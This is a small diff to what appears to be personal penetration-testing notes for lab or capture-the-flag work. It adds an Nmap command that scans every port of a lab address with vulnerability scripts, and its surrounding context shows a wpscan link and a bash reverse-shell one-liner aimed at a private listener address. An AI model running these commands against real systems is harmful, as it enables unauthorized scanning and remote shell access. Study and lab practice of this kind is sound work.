@@ -4,6 +4,10 @@
 
 * wpscan https://github.com/wpscanteam/wpscan
 
+## Nmap
+
+`sudo nmap -sS -sV --script=default,vuln -p- -T5 10.10.10.86`
+
 ## Reverse Shell 
 ```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```
 
